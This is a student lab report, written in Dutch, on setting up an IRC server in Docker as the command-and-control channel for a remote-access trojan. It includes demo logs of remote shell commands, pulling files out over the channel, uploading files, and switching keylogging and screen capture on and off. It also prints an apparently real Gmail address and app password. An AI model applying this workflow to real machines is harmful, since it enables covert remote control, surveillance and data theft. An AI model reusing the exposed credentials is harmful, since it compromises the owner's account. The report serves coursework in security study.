# Opstelling IRC C2-server (InspIRCd via Docker)

**Project:** Ethical Hacking — Applied Security  
**Student:** Ruben Van Mensel (s142486)  
**Doel:** IRC-server opzetten als C2-kanaal tussen operator (Kali VM) en RAT-agent (Windows host)

---

## Inhoudsopgave

1. [Overzicht en testopstelling](#1-overzicht-en-testopstelling)
2. [Vereisten](#2-vereisten)
3. [Eerste installatie](#3-eerste-installatie)
4. [Container beheren na herstart](#4-container-beheren-na-herstart)
5. [IP-adres ophalen voor .secret](#5-ip-adres-ophalen-voor-secret)
6. [Verbinding testen](#6-verbinding-testen)
7. [.secret invullen](#7-secret-invullen)
8. [Hoe IRC als C2 werkt](#8-hoe-irc-als-c2-werkt)
9. [Bewezen werking: demo-output](#9-bewezen-werking-demo-output)
10. [Veelvoorkomende fouten en oplossingen](#10-veelvoorkomende-fouten-en-oplossingen)

---

## 1. Overzicht en testopstelling

De C2-infrastructuur bestaat uit drie onderdelen:

```
[Kali VM — aanvaller]  192.168.232.128
  ├── Docker: InspIRCd IRC server  (poort 6667)
  └── C2Server.py (operator console)
            │
            │  IRC (TCP 6667) — VMware NAT
            │
[Windows host — slachtoffer]
  └── RAT.pyw → c2Agent thread (verbindt als bot_rvm85)
```

**Netwerkopstelling:** de aanvaller en het slachtoffer zitten **niet op hetzelfde LAN**. De Kali-machine is een VMware-VM met een NAT-netwerk (`192.168.232.x`). De Windows host is de fysieke laptop. Toch kan de RAT-agent op de Windows host verbinding maken met de IRC-server op de Kali VM, omdat VMware het NAT-netwerk van de VM bereikbaar maakt vanuit de host. Dit demonstreert dat een C2-verbinding niet vereist dat aanvaller en slachtoffer op hetzelfde netwerk zitten — enkel IP-bereikbaarheid op de juiste poort volstaat.

De operator typt commando's in `C2Server.py`. Die worden als IRC `PRIVMSG` naar het kanaal gestuurd. De RAT-agent leest die berichten en voert ze uit. Antwoorden komen terug via hetzelfde kanaal. Er is geen aparte IRC-client nodig — beide scripts praten rechtstreeks via TCP met de IRC-server.

---

## 2. Vereisten

- Docker geïnstalleerd op de Kali VM
- Python 3 op de Kali VM (operator) en op het doelsysteem (agent)
- IP-bereikbaarheid van het doelsysteem naar de Kali VM op poort 6667

Docker installeren (als dat nog niet gedaan is):
```bash
sudo apt update && sudo apt install docker.io -y
sudo systemctl enable docker
sudo systemctl start docker
```

---

## 3. Eerste installatie

Eenmalig uitvoeren om de container aan te maken en te starten:

```bash
sudo docker run --name ircd --restart unless-stopped -p 6667:6667 -p 6697:6697 inspircd/inspircd-docker
```

| Parameter | Betekenis |
|-----------|-----------|
| `--name ircd` | Geeft de container de naam `ircd` |
| `--restart unless-stopped` | Container herstart automatisch bij Docker-herstart, tenzij je hem zelf stopt |
| `-p 6667:6667` | IRC (onversleuteld) — gebruikt door `RAT.pyw` en `C2Server.py` |
| `-p 6697:6697` | IRC over TLS — voorlopig niet gebruikt, maar beschikbaar |
| `inspircd/inspircd-docker` | Officiële InspIRCd Docker image |

> **Let op:** dit commando werkt alleen de allereerste keer. Als de container al bestaat, geeft Docker de foutmelding `Conflict. The container name "/ircd" is already in use`. Gebruik dan de commando's in sectie 4.

---

## 4. Container beheren na herstart

Na een herstart van Kali is de container al aangemaakt — je hoeft hem alleen te starten:

```bash
sudo docker start ircd
```

Andere nuttige commando's:

| Situatie | Commando |
|----------|---------|
| Container starten | `sudo docker start ircd` |
| Container stoppen | `sudo docker stop ircd` |
| Status controleren | `sudo docker ps` |
| Alle containers zien (ook gestopte) | `sudo docker ps -a` |
| Logs bekijken | `sudo docker logs ircd` |
| Container verwijderen en opnieuw aanmaken | `sudo docker rm ircd` → dan stap 3 opnieuw |

**Automatisch opstarten bij Kali-herstart:**  
Dankzij `--restart unless-stopped` herstart de container automatisch als Docker zelf opstart. Controleer of Docker autostart heeft:

```bash
sudo systemctl enable docker
sudo systemctl status docker
```

---

## 5. IP-adres ophalen voor .secret

Het IP-adres van de Kali-machine is wat je als `c2_server` in `.secret` zet. Het doelsysteem gebruikt dit adres om verbinding te maken met de IRC-server.

```bash
hostname -I
```

Of meer detail per interface:
```bash
ip addr show
```

Zoek de interface op je netwerk (`eth0`, `wlan0`, of `ens33` in VMware). In deze testopstelling:

```
2: eth0: inet 192.168.232.128/24
```

> Gebruik **nooit** `127.0.0.1` als `c2_server` — dat is localhost en is niet bereikbaar vanuit een ander systeem.

---

## 6. Verbinding testen

**Op Kali zelf** — stuur NICK en USER meteen zodat de server ze ontvangt vóór de registratie-timeout:
```bash
(printf "NICK operator\r\nUSER operator 0 * :operator\r\n"; sleep 5) | nc 192.168.232.128 6667
```

Verwachte output:
```
:be35a7c45e52.example.com NOTICE * :*** Looking up your hostname...
:be35a7c45e52.example.com NOTICE * :*** Could not resolve your hostname...
:be35a7c45e52.example.com 001 operator :Welcome to the ...
```

> **Let op:** gewone `nc` zonder commando's geeft altijd een `Connection timeout` — InspIRCd sluit verbindingen die zich niet registreren. Zie sectie 10 voor meer uitleg.

**Vanuit het doelsysteem (Windows)** — test de netwerkverbinding:
```powershell
Test-NetConnection -ComputerName 192.168.232.128 -Port 6667
```

Een succesvolle output toont `TcpTestSucceeded : True`.

---

## 7. .secret invullen

Vul het `.secret` bestand in de projectmap aan met het Kali IP:

```
mail               = rvm855219@gmail.com
gmail_app_password = jctx ycdj inge tein
c2_server          = 192.168.232.128
c2_port            = 6667
c2_channel         = #c2
operator_nick      = operator
```

> `.secret` staat in `.gitignore` en wordt nooit naar de repository gepusht.

Zowel `RAT.pyw` als `C2Server.py` lezen dit bestand via een relatief pad — start beide scripts vanuit de map waar `.secret` staat.

---

## 8. Hoe IRC als C2 werkt

IRC (Internet Relay Chat) is een oud tekstprotocol dat ideaal is als C2-kanaal voor onderzoeksdoeleinden: het is eenvoudig, goed gedocumenteerd, en het verkeer is leesbaar (geen encryptie op poort 6667), wat transparantie bevordert.

### Registratieprocedure (PING/PONG op connect)

InspIRCd stuurt bij elke nieuwe verbinding onmiddellijk een `PING` als onderdeel van de registratie. De client **moet** antwoorden met `PONG` voordat de server de registratie voltooit en `001` stuurt. Dit was een bug die tijdens het debuggen ontdekt werd:

```
[DEBUG recv] ':be35a7c45e52.example.com NOTICE * :*** Looking up your hostname...\r\nPING :vthwLs4C77\r\n'
```

`C2Server.py` en `RAT.pyw` handelen dit automatisch af in hun registratie- en leesloop.

### Communicatieflow

```
Operator typt: !shell dir
        │
        ▼
C2Server.py stuurt:  PRIVMSG #c2 :!shell dir
        │
        ▼
InspIRCd distribueert het bericht naar alle kanaalleden
        │
        ▼
RAT.pyw (c2Agent) ontvangt:  :operator!... PRIVMSG #c2 :!shell dir
        │
        ├─ Afzender == operator_nick?  Nee → negeren
        │
        Ja ▼
handle_c2_command("!shell dir", ...)
        │
        ▼
subprocess.check_output("dir", shell=True)
        │
        ▼
RAT.pyw stuurt:  PRIVMSG #c2 :Volume in drive C is OS ...
        │
        ▼
C2Server.py print:  [bot_rvm85] Volume in drive C is OS ...
```

**Beveiligingslaag:** de agent accepteert alleen berichten van de nick die in `.secret` als `operator_nick` staat. Berichten van andere IRC-gebruikers worden stilzwijgend genegeerd.

---

## 9. Commando-demo's met echte output

Alle onderstaande output is afkomstig van een live sessie: `RAT.pyw` draait op de Windows host (`rvm85` / `Zevymatrix`), `C2Server.py` op de Kali VM (`192.168.232.128`).

---

### 9.1 Verbinding openen

```
> python C2Server.py
[*] Verbinden met 192.168.232.128:6667 als operator...
[*] Joined #c2
[*] Wacht op bot-verbinding... typ !help voor commando-overzicht

Type een commando (of "exit" om te stoppen):
> !help
[bot_rvm85] !shell <cmd> | !download <pad> | !upload <pad> <b64> | !spy <keylog|screen|mail> <on|off> | !status | !help
```

`bot_rvm85` = de RAT-agent. De nick is automatisch opgebouwd als `bot_` + Windows-gebruikersnaam.

---

### 9.2 Reconnaissance: wie ben ik en waar ben ik?

```
> !status
[bot_rvm85] Host: rvm85 | keylog=True | screen=True | mail=True | screenshots=7

> !shell whoami
[bot_rvm85] zevymatrix\rvm85

> !shell hostname
[bot_rvm85] Zevymatrix

> !shell ver
[bot_rvm85] Microsoft Windows [Version 10.0.26200]
```

---

### 9.3 Netwerkinformatie ophalen

```
> !shell ipconfig
[bot_rvm85] Windows IP Configuration
[bot_rvm85] IPv4 Address. . . . : 172.16.146.83
[bot_rvm85] Subnet Mask . . . . : 255.255.128.0
[bot_rvm85] Default Gateway . . : 172.16.128.1
[bot_rvm85] IPv4 Address. . . . : 192.168.232.1   ← VMware NAT interface (Kali zit hier)
```

Dit toont aan dat het slachtoffer meerdere netwerkinterfaces heeft — nuttige informatie voor verdere laterale beweging.

---

### 9.4 Gebruikersinfo

```
> !shell net user rvm85
[bot_rvm85] Gebruikersnaam                     rvm85
[bot_rvm85] Volledige naam                     Ruben Van Mensel
[bot_rvm85] Account actief                     Ja
[bot_rvm85] Account verloopt                   Nooit
[bot_rvm85] Wachtwoord verloopt                Nooit
[bot_rvm85] Wachtwoord vereist                 Ja
```

---

### 9.5 Draaiende processen inspecteren

```
> !shell tasklist /fo csv /nh
[bot_rvm85] "vmware-vmx.exe","15504","Console","1","2945 MB"
[bot_rvm85] "Code.exe","21680","Console","1","376 MB"
[bot_rvm85] "explorer.exe","6336","Console","1","312 MB"
[bot_rvm85] "python.exe","20736","Console","1","42 MB"    ← dit is de RAT zelf
```

---

### 9.6 Bestand downloaden van het slachtoffer (`!download`)

Het `!download` commando leest een bestand op het doelsysteem, encodeert het als base64 en stuurt het terug. In `C2Server.py` sla je het op met `save <bestandsnaam>`.

```
> !download C:\Windows\System32\drivers\etc\hosts
[BESTAND ONTVANGEN] hosts (1024 bytes) — typ "save hosts" om op te slaan

> save hosts
[*] Opgeslagen als hosts
```

Inhoud van het ontvangen bestand (fragment):
```
# Copyright (c) 1993-2009 Microsoft Corp.
127.0.0.1       localhost
10.151.100.12   vcsa12.sddc.local
172.16.130.241  host.docker.internal
```

> **Beperking:** IRC heeft een regellengte-limiet van ~512 bytes. Grote bestanden worden opgesplitst in chunks van 400 tekens, met een maximum van 3200 tekens per commando. Grotere bestanden falen gedeeltelijk.

---

### 9.7 Bestand uploaden naar het slachtoffer (`!upload`)

Het `!upload` commando schrijft base64-gedecodeerde data naar een pad op het doelsysteem. Encodeer het bestand eerst op Kali:

```bash
# Op Kali: encodeer een bestand naar base64
base64 -w 0 testbestand.txt
RGl0IGlzIGVlbiB0ZXN0YmVzdGFuZCBhYW5nZW1hYWt0IHZpYSBDMiB1cGxvYWQuCkFhbmdlbWFha3Qgb3A6IDI4LzEwLzIwMjY=
```

```
> !upload C:\Users\rvm85\Desktop\geleverd.txt RGl0IGlzIGVlbiB0ZXN0YmVzdGFuZCBhYW5nZW1hYWt0IHZpYSBDMiB1cGxvYWQuCkFhbmdlbWFha3Qgb3A6IDI4LzEwLzIwMjY=
[bot_rvm85] Upload geslaagd: 84 bytes naar C:\Users\rvm85\Desktop\geleverd.txt
```

Het bestand verschijnt nu op het bureaublad van het slachtoffer.

---

### 9.8 Spy-modules live togglen

```
> !spy screen off
[bot_rvm85] Schermopname: off

> !spy keylog off
[bot_rvm85] Keylogging: off

> !status
[bot_rvm85] Host: rvm85 | keylog=False | screen=False | mail=True | screenshots=7

> !spy keylog on
[bot_rvm85] Keylogging: on

> !spy screen on
[bot_rvm85] Schermopname: on
```

De toggles werken **live** — de threads hoeven niet herstart te worden. Zie `verslag_RAT.md` sectie 6 voor de technische uitleg.

---

### 9.9 Samenvatting aangetoonde mogelijkheden

| Commando | Aangetoond | Resultaat |
|----------|-----------|---------|
| `!status` | Ja | Hostname, gebruiker, spy-status |
| `!shell whoami` | Ja | `zevymatrix\rvm85` |
| `!shell net user` | Ja | Volledige gebruikersinfo |
| `!shell tasklist` | Ja | Draaiende processen incl. RAT zelf |
| `!shell ipconfig` | Ja | Alle netwerk-interfaces |
| `!download` | Ja | `hosts` bestand ontvangen en opgeslagen |
| `!upload` | Ja | Bestand op bureaublad slachtoffer geschreven |
| `!spy ... on/off` | Ja | Live toggles zonder herstart |

---

## 10. Veelvoorkomende fouten en oplossingen

| Foutmelding / symptoom | Oorzaak | Oplossing |
|------------------------|---------|-----------|
| `Conflict. The container name "/ircd" is already in use` | Container bestaat al | `sudo docker start ircd` |
| `Cannot connect to the Docker daemon` | Docker-service staat niet aan | `sudo systemctl start docker` |
| `C2Server.py` hangt na `[*] Verbinden met ...` | InspIRCd stuurt PING tijdens registratie, client antwoordt niet → timeout | Opgelost in `C2Server.py`: registratieloop beantwoordt PING automatisch |
| `nc` geeft meteen `ERROR :Closing link: [Connection timeout]` | Normaal gedrag — `nc` stuurt geen NICK/USER | Gebruik de `printf` pipe-test uit sectie 6 |
| Agent verbindt niet met IRC | Verkeerd IP in `.secret`, of poort 6667 niet bereikbaar | IP controleren met `hostname -I`, testen met `Test-NetConnection` |
| `c2Agent` start niet / doet niets | `c2_server` of `operator_nick` ontbreekt in `.secret` | `.secret` aanvullen en scripts herstarten |
| Operator ziet geen antwoord van de bot | Bot gebruikt andere `operator_nick` dan verwacht | `!status` sturen en nick in `.secret` controleren |
